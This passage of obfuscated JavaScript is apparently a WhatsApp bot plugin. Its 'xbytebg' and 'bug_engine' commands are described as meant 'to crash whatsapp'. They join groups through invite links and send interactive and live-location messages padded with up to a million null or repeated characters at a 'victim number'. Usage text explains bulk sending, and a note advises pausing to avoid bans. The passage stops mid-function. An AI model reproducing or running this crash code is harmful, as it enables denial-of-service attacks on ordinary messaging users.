'nsJcPtpdNG', 'WOFdQ1pcHSo5', 'EX4xWO3dOG', 'sSkIWPFdUwe', 'W5hGTBFGTyxGT4pGT70', 'bWRcH2RdSq', 'WPTlW50CyW', 'ESoCwCkO', 'D8kHWQNdVeO', 'ordcJhuA', 'oGKDW4lcTW', 'WQRcRePg', 'WOqhwCoEW5m', 'W7pdNSk4WOy5', 'FCkYW6VdQmoE', '8lcdIFcNGzRXGQg18j+WMCoS', 'WQFdNSkAFYm', 'WPldINddKCoB', 'ycFcN8k/fG', '4lsBW7ZcOIu2', '4RgR4OoC4Ocw4RgbYie', '4PMF77Mg4Oc6ZB/mMTQi4Okdam+QZA82ZAlnQa', 'WObEWOO', 'W6KfWRLcWQK', '4PAT4Q2CWPdIMlxVUBFIGONcJa', 'W6DXitddLa', 'FadcGLiV', 'WP0iW7W', 'ka0uWORdOG', 'fYJcVezB', 'FCkpWPRcVmkF', 'WO7cICoaW5Gf', 'hSoMqtRcQG', 'WOpcMGLJWRa', 'zHarqhy', 'pHGrWRNdGW', 'WQJcHSoGW79R', 'WP0iWQvxWOiiWObj', 'W5ZcGNRdGmol', 'gJ8aWRpdPW', 'c0VdQ0JdGW', 'lIBdK0xcPW', 'DXFdML4/', 'W6RcGtqlWRO', 'W68CWO1jW5O', 'WPhdOmk9uxm', 'C8kDW6/cPSoB', '4PIi77QikokzVo+6MMlcNW', 'WP7cQSoAW7H7', 'WQxcOei', 'bpcGG6/cTCoxW7K', 'WPHjW7CBWRG', 'hSoOudpcTW', 'sdVdQMaI', 'WQjJW4q1cW', 'WOvKxmoSWPS', 'nqLAW5NdRq', 'WOBdSNS', 'WRagFe0R', 'W4nvWQ5QW7y', 'W7lcT8o2dsW', 'W6eIyYZdGW', 'fmoKbctcOa', 'fmoMW5BcVIq', 'WODoWQ8+WQm', 'nHGwWPFdVW', 'qJVcIW', 'WQhdILf+W6W', 'qmkGrCkUsW', 'B8kmWQFdMgO', 'FSkXWOdcL8k8', 'WOldQ8kRqca', 'W7/dVHTIW5C', 'mSooW5BcPSkB', 'W43dJwhcUa', 'W6hdKIPDW6O', 'WRRcMgLfWRe', 'WRCIWPPbAq', 'WQO3WPSjpW', 'remkBSkD', 'W6hcSfr8WPG', 'ntVcR8kAuq', 'yqZdH3KU', 'lJlcRSkvxq', 'WPZdRhJcK8o0', 'vmoLymk8qa', 'CMldK8oeW4W', 'AK/dI1jN', 'W49DWP1jWP8', 'W5e/WOnFW5m', 'guFcGgVdUq', 'gIhdJmoieG', '4PIf77I3W6VIMQBVU6zHW7i', 'vDgFWOlqGhW', 'AKPjW5BcRG', 'WR/cSJfUWRa', 'WRpdKXaPWOy', 'WP7dI0NdGSov', 'dvbqh2a', 'WQjvpmoHpq', 'WRjLwhrI', 'WOhcIf7cH8oG', 'pG/cJ3FcTq', 'WQG8jJBdNG', 'b1FcUaNdIG', 'cCo1rtxcSq', 'WQHromkXCW', 'eJpdNCknhq', 'W5FdMvWfka', 'WRdcOKOovW', '4lswWRhGT73GTQNGTiK', 'W6hcO0NcG34', 'W5BcIwVdKmoE', 'eIZcPfCs', 'W7WEW6PqWRW', 'yWVcHCkxdG', 'WQa0WRVcTSkx', 'W63cTN7cMNO', 'dsZcUK8A', 'wSk3WPddSxy', 'WQDNW75zmq', 'tmoLwmkOrW', 'zZZcRSoixW', 'W6OlW7DfW6W', 'WP7dP2i', 'WR0cW61fWRW', 'WQyTW4D0eq', 'eMBcSLSd', 'WOitW7q8ca', 'WRSrsvOo', 'WQGNkIBdMq', 'W7KVW5v+WRW', 'ACokd8oYyW', 'ggNcO1DB', 'W7NdMhuDW6C', 'WOJdS2FdVa', 'kmkvWPhcTmot', 'cwboWPBGTie', 'zwtcSmkysa', 'WQGIW5qjja', 'W65tWODZWRu', 'W4T4WPf2WPm', 'eGDtmSob', 'WPLpW7asWQC', '4lw+4lEz4lE+4lAN4lAw', 'W5ycW6qPWOO', 'j3JdNwFcGq', 'W7qCW7XUWRW', 'W6tcVvvksa', 'uCkZWO3dRv8', 'W6aLnZxdNG', 'jwtdGSoXma', 'WRdIN5eZW5Tz', 'W5RcRwZcNSkV', 'WRO/kGqd', 'W5Lwg8oeWPO', '8yggTSoE8jUYOpcAO4lXHPcg', 'WQxcJ8oTW4O', 'W4hdQwVcSmoG', 'sqVIH5THpW', '4lA+4lsUW5NGTy3GTkm', 'WPhdP2JcNa', '4lEw4lE2WRJGT5dGTB0', 'c8oIsZlcSa', 'W5VcM2ZdGSoy', 'W43cJhZdRmkK', 'kcZcSG', 'bgjmW4tdSq', 'cwPoWPtcQG', 'W6pdNGbBW6y', 'D8kXW6FcP8or', 'WReGqG', 'goc2NEc0GEc0L+c3Qa', 'yJtcKJpdMG', 'W7RGT7hGTBRGTQRGTOi', 'cqBcKMhdSG', 'hgFdUmopbq', 'W4ZcJw/dJ8oE', 'cblcGvVdSa', 'icZcPmoptG', 'WQCQrhbI', 'a0X8W6hdUW', 'WODkWQX7WRC', '4lEJ4lELq+c2Hoc1Iq', 'W6nNz0bx', 'eSo+rZRcSa', 'WPhcSZ/dQ8kT', 'eI3dQKeo', '8jkuUCoKWOyOuW', 'bZtcLbRdKa', 'yg3cTMxdOa', 'W4Hfrvy0', '8l6zOc3XG6co8ygII8+cZ6W', 'WOGAWQHpW7S', 'WPWBWQeAWQG', 'WQpcICoOWP5J', 'WPxdG8k8zGy', 'W4fseCoxW58', 'WOTrWQr1W4q', 'WRtdSuhdJEc1UG', 'CM7dU8kjda', 'WO4YW4xdQCoV', 'W6RdV2xdRCkW', 'o15YW4xdIa', 'WOhdRtVcJmoK', '4lAA4lsp4lsN4lwBmG', 'g0RcULlcHG', 'W7xcJc3cPCoX', 'WQ1DW5fNgq', 'W6TQAuzB', 'WRddLSkCWOqh', 'WQ7cI0n4WQm', 'W4vwhCoxWPO', 'eqdcRMu2', 'W6hdJxVcRSoH', 'bWpdHMBdOa', 'vSoGWQldQSow', 'W7FdG8ovWPPl', 'bN7dMCoRyW', 'W5OQWR1DW7C', 'suFdOmocW7q', 'WRFdOmoOqIe', 'WOtdN0Kp', 'W6BdTXmAbW', 'Z7NoNmkL8kQUTEg3O8+N4Og0ZzC', 'W7/cSwVcJMy', 'rmo8r8kBaq', 'W5ldUCkFAdK', 'W4BcTSontvq', 'W4Wvu8kxW4y', 'a0NdTa3cHa', 'W6NcN8oytMu', 'WQhcI8oJW5XU', 'W5/dNCkoFq', 'W6KZW6NdQmot', 'WOtcNCo9W4aU', 'W7X/Bw/GTlC', 'WR/cOXO', 'rsNdJSk2pW', 'x+c3K+c1Koc3QEc3Oq', 'cWtcKItdOq', 'WQfOW4i1ea', 'hSoMf8k7W5O', 'WRCIW5SEoq', 'W7aAWQ5iW5K', 'obWmWOBdSq', 's8k4WOddPwC', 'W7ixpCoSW58', 'AK9iW5dcOa', 'W6WfnWJdQG', 'uaSeaNG', 'W7ZdKg3cJCoV', '4lAxW6xGTQlGTAtGTO0', '4lsV4lEPW5pGT7RGTRy', '4lQIWRlIGlCr4Og5', 'W57dHe3cJCoa', 'jmkGW7VcR8kF', 'r8kKW4hcS2K', 'W5NcVfVdP8of', 'WP4ly08V', 'WRGGqNmJ', 'WQmxcmoyba', 'W6dGTA7GTRpGTkpGTla', 'W6fYbdz7', 'WQiTWRvsWR4', 'kw3cKCkvbW', 'W59FWQnRWQi', 'WP9OsCoQWPK', 'qw8MzCk8', 'WQFdNSkhcCkd', 'WPddH8ko', 'WQtcRe3dNCk7', 'W5aWuwS0', 'WRpcUrRcI8km', 'W6T2WOfAy8orWR/dGrJcGg4', 'E8oBW5BdVSkq', 'FSoCa8oMBW', 'WQRdT2NcK8kH', 'dNveW5VdNW', 'WPRcKb3cI8kj', 'esD4W5pdVG', 'DYhcUW', 'AmkEWRRdPKi', 'W5xdSMNcKmoI', 'WQxdICksp8ka', '4lwGaEc3Loc0QEc2HG', 'WPpdM10', 'WPyOotWA', 'fmoXaCoSeW', 'WRy7lq', 'W4BdOYJcVCk1', 'W4dcHCohk34PcmkIWPBcL8oSuSkq', 'W6BcKSo/W5DH', 'W7OZW5Pkjq', 'aSo3CXpcNW', '4lst4ls84lAL4lwXWP8', 'BSkpvmkEyq', 'W7JdSSorsNG', 'WRlcGSo0W4O', 'vsRdHvCg', 'W67cL1JcIu0', 'Xze04OkTCSoz', 'W6pcRSogW4Xe', 'WP0/WQBdPCov', 'o2HzW4tdQq', 'yqRdKaBGTOq', 'W6NdS2VdJ2G', 'W6qtzmkKFa', 'WQCGxwe7', 'WRfLDhxcNG', 'z8ovdmk1ia', 'WO3dUMpdK8k0', '4Bsl4BsfWRhHTP3HTQe', 'W4bwWQ8MWOu', 'WOhcRdxdLEc0MW', 'WQpcOwxcMMq', 'wCkVWPZcPCkP', 'fSoizrxcVW', 'WPBdM007dG', 'W5mlcfiP', '4ls24lA54lsH4lERW6W', 'WP4kW7yNW68', '4PYE77Uk4BE74lYB8jweG82a4z2/8kAYGq', 'FIhdHSoUW4C', 't8kkWRxcP8ka', 'F1tdO8oLW7W', 'WP/cMYil', 'umksWQ7dJhu', 'WOtdHEc2NUc3GUc1QW', 'ALiqCSks', 'ae7dLsldPq', 'BCkWW6/dQmoB', 'dXpcH23dUq', 'WQ/cP8oX', 'W4PmWQnJWPS', 'WQldJCkWCsi', 'WOFdU3WilW', 'WQJcHu9tDa', 'WQ/dJ8kF', 'WQaRugeS', 'WRCTlryf', 'umkxWRVcPCkY', 'nrWmWORdOa', 'WQGYlcVdMq', 'yahcVCkNea', 'W4FcRN3dKCkl', 'arNdUH3dNq', 'W5NVV7JcTh7cIUkcHEkbKW', 'WQxcHJq', 'WOrzWO4lW70', 'WQhGTzxGTk/GT702', 'WQG9W7xdJmou', 'W7rJlmoNWQa', 'mmo1WRVdVSkg', 'WO/dUSkTa2K', '4BAx4BEglEg3Oog0Jq', 'W77cHfjRWQC', 'WRBQMB/dHoQzPXC', 'WQ7cPfvcea', 'WQ/cMZrkWRm', 'g3rcW5NdVG', 'W4DbW6TWWOG', 'WPhdRSk7sxm', 'W5zFcmox', 'g8oVW5RcScS', 'YkJlMUg3P37HTRu', '4lsi4lEQ4lwX4lEuW4m', 'hJ3cRWjA', 'ovJcMH8', 'WPZcH3NdHCom', 'u2RdLmoWBG', 'WPxGTQVGTQ3GTjlGTlu', '6PU8W4xIGPpISBVIGBe', 'WQxcU0/cKmki', 'WQ7cGCosW4ua', 'WP3dUZVcOmkK', 'smkaWRtdGgO', 'E3DYW4pdGG', 'WQreF8kPFq', 'W6NGT6tGTzRGTlFGTA0', 'WQKwW7aNfW', 'WQ7cLuP6WQm', 'W4q9wKSU', 'WRBdTNKVnW', 'W6tdHY0dAG', 'qCkArCk4sW', 'oCkiwCkKnq', 'W4bss8kzW4S', 'tLJdJSoiqq', 'W7uOvhmX', 'kbGwWOFdMW', 'WPBdHmkuaSkq', 'W6ZdVX/cI8kf', 'cwnoW4tdJW', 'uKCpBSks', 'md/cIZ/dGq', 'WQFcHrfHWQ4', 'WRjYW7ddP8ol', 'W63dG8oFW4ig', '4lEuiEc0TEc0Hoc3HG', 'W4NcRf8MWPG', 'WQddHCkQyHG', 'W7BcU1NcGuq', 'E8keWPFcTCk+', 'yM7dO8kMW4K', '8lQdQpc7GQlXJPoo8l+YQFcNSB0', 'WP/cNCoyW6Hj', 'nHOjWQVdUa', 'mmo7WR7dVSkg', 'W51DWQHZWP0', 'WRlcJSo4W4CT', 'bqNcLq', 'WQ7cLvr2WRq', 'DM/dLg3cJG', 'WR3IN4hcVa9f', 'vfewBCkF', 'F07cGW', 'WR1tWQHjWRq', 'z0rnDSkB', 'da7cIMhdUW', 'W4/dTcBdSSk7', 'w8o3vJNcSa', 'W5WCWR9F', 'W4NcO3ZdRCkX', 'lYivWOBdOG', 'c0ldRmoWca', 'W43dQar1W4a', 'WR7dTtxcU20', 'W5xWVBkn8ykGLFcWSyNWNPcD', 'WOldOCoOrce', 'W54QBeyw', 'EmkvDCkRAq', 'FCkzr8kZiq', 'nZVcUCkA8jceJG', 'gNxdKCoowW', 'EWGlWORdUa', 'D8kJW6NcRCkF', 'mt/cQJVdIW', 'sCkGrq', 'WOCcdSoIWO7dJwxcKG', 'WOPvW5mAFG', 'W6dcQWddH8kn', 'cZRcI1ml', 'W6tdImktmCow', 'vN0wEmk/', 'WQVcGSo/W41U', 'WPFdQSkWvq', 'uaSaqcm', 'WQyKma', 'zg3dQHhcHa', 'q8kHfSk8cG', '4PYQW4GdBSky', 'W7ZdR2hcR8k1', '4lEh4lAq4lso4lEXwW', 'WONcNJ7cHCkJ', 'WQRcUePbwW', 'W7dcP8oNxgi', 'kvql4R2nWRa', 'WR0dW6OrWQi', 'WOjvxCobWPK', 'w+c0IUc2VUc2Noc1NW', 'CCkMW4lcVCo1', 'WRpdPSk3gcy', 'lSkigmoQFW', 'gqlcQ2hdPG', 'WOhdPCkTqIC', 'vhRcG8olaa', 'WO1uWPWlAq', 'rKiqzmot', 'DGhcNCkxfa', 'wbeqtsy', 'W7fxnmoWpq', 'i8kW4OcCW5JdMq', 'eCkxWRtdJhq', 'yUc3Q+c0U+c2MUc1Qa', '8ykxJYq+lYq', 'W7v8ahG6', 'zCkvW4/dPmob', 'W77dM34zW6e', 'aZpcKSkotG', '8l6tRpcEG57WN7oE4l+6Z4hpN/c2T5S', 'WPhdPJBdI8oG', '4P+W77Ic4Bw94l+tZl7HNy3XG6gL8l6rKW', 'tmkBWPtdS0m', 'sCkGqmk4rG', 'WOrvWOa', 'fCoDuYZcLa', 'WQK3W5Kdja', 'g8oYb8oVxXbLidBcJG', 'WRa8qG', 'FmoyqSkUla', 'tLKaBCkg', 'W4Grweb9', 'E15A4Os3W4G', 'W5fkueS/', 'W4lcR1tcQ04', 'W7/dG8knWOSh', 'W7RdMhuAW6W', 'WOSAWQ17WQq', 'WOvCganR', 'jYNcLhdcLG', 'W4HkWQvSW7C', 'W4GarubL', 'E8onqSkUla', 'WR3dSZZdItK', 'WQ7cQ0/cPCkv', 'W70QAevm', 'W6NcPSo2x2u', '4lwa4lED4lw/sUc3VW', 'WQ7dMCknDbS', 'dcZcPeC2', 'WOvHWQrZW4K', 'W6tdS8kji8ow', 'hNhcJ8oEdG', 'WPZGT47GTBRGTRJGTQ4', 'W7dcUZ9K4Ok8', 'W5evrfzN', 'd03cUbZdJa', 'W5abWR9tW6y', 'WQJcKSoHW5XQ', 'WRhcICoFW4OD', '4lEq4lA1W4BGTRZGTyW', '8yQeJ++4VSYf', 'EmoytCkPka', 'WRfOW5f2da', 'WPCGW6mAaW', 'tUc2TEc1VEc0Joc2QW', 'EGVdK1ad', 'WQCGxg82', 'W799jmoAWPa', 'nSkGD2pcIG', 'jmoYWQddQmo4', 'W4nkWQrRWQy', '4lsY4lEJ4lsnc+c0Sq', 'WR5vnCo2oW', 'W7illr4m', 'W6hcP2pcJ2m', 'WRZcOmoScCoC', 'Bc/cLa', 'WPpdNcFcLmoA', 'W4LNWRHJWOG', 'z8kQW6/cVa', 'WPFcQuPPzG', '8kwPV+kdToc+P+koKEkaTFcAI5dXH4QP', 'W6hVVQRdPKNcR+kcNokaGq', '4lEd4lwj4lEG4lAeW6u', 'AqNdKumZ', 'W5ZdONdcQa', 'W5CAWQ5RWRS', 'WRCPW40IbG', '4lAd4lAmW6VGTl/GTOq', 'l10vWOBdPq', 'qCkiWR7cVmkq', 'WPddHCognCke', 'W4hcJSoikxG', 'W5lcVSo8ewddQ8onWQXqyLq', 'pL0pWOldVW', 'W6O0mq', 'WQGdz8kKna', 'WPRcKvysjq', 'EW0uWOBdTW', 'WP/dMW4jmG', 'WPpdQSk6aFcRL6O', 'W7tcK8oqzCoc', 'W6GntrmP', 'F3tdV8oYWQW', 'W6RcUfq', 'W6NcTI/dGtS', '4lA/WPNGTQJGTABGTOi', 'DmkNW7ZcPCow', 'W5tcSxXVWQS', 'W7pcM8oxBSoB', 'WQqXru0f', 'WQxdICksDSkc', 'W6NcS8o0sJy', 'jKmlW7tdHq', 'tdVcKmknuq', 'WQlcTG3dImkd', 'W6xcRg7cL38', 'xWdcOv/cKq', 'dcDPW4pdTW', 'W4xcTI3dJG', 'W78fW71i', 'WRZdKSkEESod', 'WOldQNRcI8oY', 'W43cHZ/dL8ox', '4lwo4lwaW6JGTRVGTPy', 'WPtdM2/cKCoo', '4lsm4lEnWPdGTPlGT5u', 'WQGOlddcJq', 'WRBcImo/W54U', 'setdPW7dGG', 'W6CWjXhdGG', 'oxJcKt/dLa', 'WOydwSkwW50', 'pmoZWRJdV8km', 'WOldNu0plG', 'WPFdT2/cI8oU', 'WPhcVKid', 'W6lcJh3cV8kT', 'W7O+nJxcJq', 'W7hVVQveW6ZcUEkbHUkdKW', 'W50rtrjM', 'W7dcUfldT8oz', 'tNFdImoEfq', 'tUc2T+c1RUc1VEc2SW', 'WQZcGSoVW4PQ', 'wGZcQCk+pq', 'WQvejCoN', 'EX4xWOFdSW', 'W6LmWOj6WOa', 'WObIWQmLBq', 'WR8bcSo7ka', 'WRFdJ8kimSk7', 'W4xcJb1zAG', 'WRbfpSoYoG', 'WR4IW4mppa', 'WPTdWPWxvq', 'hqBcJLyQ', 'h+kgOmkRmZK', '4PIG77UMl+kyV++7IM5s', 'W7pcJhVcVCo/', 'WQNcK8kSW5XU', '8yIcSVcrG77WRBkNW7tWNjgZ', 'WOipxCkuW4FcR1lcGCkOW5ZdKCkw', 'sNmKBCku', 'WOddSx4', 'EHZdHW', 'W4rcbSoxWPO', 'WQHN4lsK4lEW4lE3', 'sWOrddK', 'kXxcIJldVa', 'W4SrWRjiW4q', 'W7mpW6Sr4lsp', 'W7i0WOKItq', 'WRtdNdZcRmoZ', 'vKJdMctdTG', 'W4OxtvWg', 'W6XPe28K', 'W7GoWRLgWQq', 'WRrRnmo3', 'W7dcMshdSCkG', 'W5qexeaM', 'EWRdJ1vL', 'W5DDWQzPWP0', '4lw64ls44lAf4lwX4lsf', 'o+kcLrhIGihcIW', '4lsD4lAcW6TPWP4', 'W7/cOUc2R+c0U+c0Va', 'pCo0WRBdV8kpWOC6W73dKexdGa', 'yUc2MUc1Noc2H+c0Iq', 'WRLXWQC', 'WRFcIColW58', 'W6/cI1i/WRC', 'DSkxWRVdIKa', 'mSovW4hdQmok', 'W67cPSoxFNi', 'WOFdP3BcKmo1', 'jZ7cS2VdRa', 'W4OmWRnFW7e', 'WQ3cJrDkWQy', 'WQ7cJtq', 'WQOdpSoMoW', 'W6RcGfu', 'WOahwCkqW40', 'z8oxqSkWoa', 'WQlcGCow', 'hG5Aomok', 'WRdcPmojW69A', 'WRBcIUc1T+c3Joc1Kq', 'CYhcG8k/nq', 'WOxcSZ/dPmo0', 'WPtdQmkYbCkh', 'pXGl', '06ms0A920jZoOm6f', 'WQhdJmkdjmkt', 'W7ZcGeP+WRS', 'BCksWORcSmku', 'WQ/cI8oPW612', 'W67dKglcUmo+', 'FmkPzCk0yG', 'W7dcP8oJqwi', 'WPBdQNRcIW', 'WP7dLSkAtIm', 'wSkZWOddVgy', 'fcRcQr/dGq', '8lsGPpgnKilXIlc9ZzxWPQk38k2dKq', 'WPldN8kFBG', '4lwS4lAP4lwD4lE54lsK', 'W6W1nbpdIG', 'WQlcUH0', 'WORdVmoOvJS', 'WR7cJt9F', 'W6DTBuft', 'WPhdQSkMrty', 'W6eqWObgW70', 'z8olqmo8kq', 'W7ZcSIpcLw8', 'WQeXW7ddO8kh', 'WOvlZ7BnLCkiZBZoI2loG82Btm+OZ5i', 'bq1bnSol', '8y6sPEkaQVcxOOxcRUg2PEg2HUg3Sq', 'uNNcJ8oLAG', '4lsk4lAQcoc2R+c2LW', 'bvZdOq', 'W4xcLL3cTuG', 'zSoyvCoYoG', 'W7SOt2Ki', 'aHtcR8o0xq', 'WRCLW5ayla', 'WOpdKSkoFY0', 'D3JdI3ZdLG', 'WPZGTQxGTPpGT6RGT7y', 'dxb0W5xdUa', 'W7fcmSo3la', 'sNddVHTn', '4lsL4lw54lEP4lA44lsw', 'W53dS23cR8k1', 'WRSQW5biAG', 'hrFdJSkBpa', 'WRFcNmoGW600', 'lSopsmk/oq', 'WOHsWPCrwq', 'k2NdLCoYba', 'WRmQlrys', 'tNxdJSkDda', 'W7ldNCkgW41D', 'WOy/csmp', 'X6Li4Oc6WO94', 'W4JcJSohi3u', '4OgHWONGVQBmT86Q8yURIUkbUUkvMW', '4PEMFZS1', 'WQ9DWQfXWQS', 'W5HyW6y', 'W6dcPSoNdJC', 'W6tcO1joxa', 'W5lcT8oWwxm', 'WRSZpXah', 'W6BGTBVGTyJGTi/GT4u', 'lHOYWPtdTa', 'zGpdHWyI', 'W45jWP9SWRm', 'WOrqhWP1', 'WQabnXna', 'uSk6WOZdQhy', 'W5VcQ0ZdMCkl', 'WQldTaOxcq', 'zmkoWPu', 'W43dPuLKW4y', 'pXtcGYq', 'WR3GT63GTltGT6pdRa', 'WPf9yKv3', 'gmo2W4pdTa', 'W7xdSSoVsMu', 'vbBcTXZdGq', 'iZxcP1VdMa', 'WPuowmoBWOC', 'zColtSk5fq', 'W6zeCmkQEW', 'xJhcK8kmwq', 'fJRdQNuA', 'WOyrFIqN', 'W6nmWQDvWQ4', 'W6JdR0Hfwa', 'WP7GTA/GTRlGTBhcNW', 'W6JcJetdKmkc', 'W5vzWQHbWRG', 'WOBdOUc2TEc0PUc2OW', 'Cw3dPmoJWOq', '8lsdHpgpO7FXHyMj4Och4Pw1WPa', 'nJ/cNYO', 'W60FW7jy', 'W6lcQq7cI8kv', 'W7hcT8oWqN8', 'dL9UW5ldNW', 'CmobW4JdOq', 'WRbmoa', 'xItcI8oYpW', 'qIpcVCkKW5i', '4lAJ4lwR4lAB4lsozW', 'ESkoWOZcOCot', 'wCoXstNcSa', 'mG5yWRxdTW', 'WQlcNw7dP8oN', 'WRlcImkSW5n2', 'eCo5vJFdPq', 'ySoRzSkfpq', 'WP7dJq4Dnq', 'eINcGCopzG', 'q1iq', 'CI7dSSoPW4S', 'WPmXW7KGjG', 'nGdcJqRdVa', 'hMjhW5NdOa', 'W6NcT8kIthK', '0OFcMvJrLsi', 'q8odqmk3jW', 'WPacW7qSW6a', 'crLmCSkw', 'AmkTW6i', 'W4ZcJxVcG8oq', '4BER4Bs2W5pWOkgK4Ogn8lgcJa', 'ASoLySkscG', 'W60yW7zvWRK', 'W5DxWRKMWOy', 'dcZcVGfb', 'iJBcQCogW4e', 'W4uCWQLFW7C', 'pmknfmoRFq', 'DwNGTB7GT6FGT4y', 'pf0SWOZcTG', 'ceVdTWxdQW', 'WRZcQWj6WOe'];
    _0x433f = function () {
      return _0xff6424;
    };
    return _0x433f();
  }
  const _0x4cf387 = {
    pattern: "xbytebg",
    react: '🔖',
    desc: "To crash whatsapp groups",
    category: "bug",
    use: ".xbytebg",
    filename: __filename
  };
  function _0x191822(_0x15011d, _0xe76b6e, _0x3700a9, _0x80afee, _0x3bd933) {
    return _0x3baf(_0x15011d - 0x3e7, _0x80afee);
  }
  cmd(_0x4cf387, async (_0x3f095e, _0x5eff85, _0x3dacb2, {
    from: _0x5a617e,
    prefix: _0x332e93,
    l: _0x51ba7e,
    quoted: _0x35ad85,
    body: _0xc9d6c4,
    isCmd: _0x34e26c,
    command: _0xeabc02,
    args: _0x285fd3,
    q: _0x4a241f,
    isGroup: _0x1bff7c,
    sender: _0x5d37e1,
    senderNumber: _0x36e32b,
    botNumber2: _0x280a90,
    botNumber: _0x146e90,
    pushname: _0x37474c,
    isMe: _0x949985,
    isOwner: _0x563a62,
    groupMetadata: _0x23e0a3,
    groupName: _0x2c323f,
    participants: _0x48d06f,
    groupAdmins: _0x40e150,
    isBotAdmins: _0x278b1e,
    isAdmins: _0xf21ffc,
    reply: _0x21808f
  }) => {
    try {
      if (!isDev) {
        return _0x21808f("⚠️ ⚠️ *This is X-BYTE bugs... You dont have permission to use this Bot..̅");
      }
      if (_0x5a617e.includes("923072380380") || _0x5a617e.includes("923458017380") || _0x5a617e.includes("923152380380") || _0x5a617e.includes("923453800380")) {
        return _0x21808f("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0x5a617e.includes("120363331372867340@g.us") || _0x5a617e.includes("120363320416667582@g.us")) {
        return _0x21808f("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      if (!_0x4a241f) {
        return _0x21808f("*HOW TO SEND BUG TO GROUP*\n\n" + (_0x332e93 + _0xeabc02) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + _0xeabc02 + " linkgc amount\n\nExample:\n." + _0xeabc02 + " https://chat.whatsapp.com/xxxx 10");
      }
      const _0x7eae21 = {
        remoteJid: "status@broadcast"
      };
      const _0x2f941c = {
        'participant': "0@s.whatsapp.net",
        ...(_0x3dacb2.chat ? _0x7eae21 : {})
      };
      const _0x28a8c3 = {
        title: "X B Y T E,  B Y  H A M Z A"
      };
      const _0x8830a7 = {
        listResponseMessage: _0x28a8c3
      };
      const _0x5eec82 = {
        key: _0x2f941c,
        message: _0x8830a7
      };
      let _0x4d0103 = _0x285fd3[0].split("https://chat.whatsapp.com/")[1];
      let _0x29bdbb = await _0x3f095e.groupAcceptInvite(_0x4d0103);
      for (let _0x45a63c = 0; _0x45a63c < 5; _0x45a63c++) {
        const _0x41d300 = {
          title: '',
          subtitle: " "
        };
        var _0x36eeab = generateWAMessageFromContent(_0x3dacb2.chat, proto.Message.fromObject({
          'viewOnceMessage': {
            'message': {
              'interactiveMessage': {
                'header': _0x41d300,
                'body': {
                  'text': "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
                },
                'footer': {
                  'text': "›          #xbyteTech"
                },
                'nativeFlowMessage': {
                  'buttons': [{
                    'name': "cta_url",
                    'buttonParamsJson': "{ display_text : '⿻xbyte⿻', url : , merchant_url :  }"
                  }],
                  'messageParamsJson': "\0".repeat(1000000)
                }
              }
            }
          }
        }), {
          'userJid': _0x3dacb2.chat,
          'quoted': _0x5eec82
        });
        await _0x3f095e.relayMessage(_0x29bdbb, _0x36eeab.message, {
          'messageId': _0x36eeab.key.id
        });
        await sleep(700);
      }
      _0x21808f("<✓> Successfully Send Bug to " + _0x29bdbb + " Using " + _0xeabc02 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
      const _0x41c99b = {
        text: '✅️',
        key: _0x5eff85.key
      };
      const _0x1a852d = {
        react: _0x41c99b
      };
      _0x3f095e.sendMessage(_0x5a617e, _0x1a852d);
    } catch (_0x437fe1) {
      _0x21808f("an error occurred while executing the command contact the Hamza developer!");
      _0x51ba7e(_0x437fe1);
    }
  });
 
  const _0x2d2167 = {
    pattern: "bug_engine",
    react: '🔖',
    desc: "To crash whatsapp",
    category: "bug",
    use: ".bug_engine"
  };
  function _0x593d7d(_0x36a05c, _0x722c44, _0x5ca21f, _0x40ffb0, _0x5cdfc8) {
    return _0x3baf(_0x5cdfc8 + 0x283, _0x40ffb0);
  }
  _0x2d2167.filename = __filename;
  cmd(_0x2d2167, async (_0x4d9e09, _0x54af2f, _0x1065ad, {
    from: _0x29d825,
    prefix: _0x38b9e2,
    l: _0x4df560,
    quoted: _0x44168f,
    body: _0x405831,
    isCmd: _0x53f3d4,
    command: _0x5e3071,
    args: _0x303a39,
    q: _0x200ab3,
    isGroup: _0x45c589,
    sender: _0x5e9e90,
    senderNumber: _0x41d4bc,
    botNumber2: _0x59ae83,
    botNumber: _0x413531,
    pushname: _0x470231,
    isMe: _0x290818,
    isDev: _0x2c3f75,
    isOwner: _0x29a4f1,
    groupMetadata: _0x2edad9,
    groupName: _0xd7c16c,
    participants: _0x5d51bf,
    groupAdmins: _0x46b2b1,
    isBotAdmins: _0x5c1e5a,
    isAdmins: _0xd6eb51,
    reply: _0x3c8cb4
  }) => {
    try {
      if (!_0x2c3f75) {
        return _0x3c8cb4("⚠️ ⚠️ *This is X-BYTE bugs... You dont have permission to use this Bot..̅");
      }
      if (_0x29d825.includes("923072380380") || _0x29d825.includes("923458017380") || _0x29d825.includes("923152380380") || _0x29d825.includes("923453800380")) {
        return _0x3c8cb4("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0x29d825.includes("120363331372867340@g.us") || _0x29d825.includes("120363320416667582@g.us")) {
        return _0x3c8cb4("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      if (!_0x200ab3) {
        return _0x3c8cb4("Use " + (_0x38b9e2 + _0x5e3071) + " victim number|amount\nExample " + (_0x38b9e2 + _0x5e3071) + " 91xxxxxxxxxx,5");
      }
      async function _0x152e15(_0x5483b2) {
        var _0x17c6df = generateWAMessageFromContent(_0x5483b2, proto.Message.fromObject({
          'viewOnceMessage': {
            'message': {
              'liveLocationMessage': {
                'degreesLatitude': 'p',
                'degreesLongitude': 'p',
                'caption': "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½" + "ê¦¾".repeat(50000),
                'sequenceNumber': '0',
                'jpegThumbnail': ''
              }
            }
          }
        }), {
          'userJid': _0x5483b2
        });
        await _0x4d9e09.relayMessage(_0x5483b2, _0x17c6df.message, {
          'participant': {
            'jid': _0x5483b2
          },
          'messageId': _0x17c6df.key.id
        });
      }
      async function _0x385cdf(_0x26cc2e) {
        const _0x34b21f = {
          product_header_info_id: 0x4433e2e130,
          product_header_is_rejected: false
        };
        var _0x4a8aa7 = generateWAMessageFromContent(_0x26cc2e, proto.Message.fromObject({
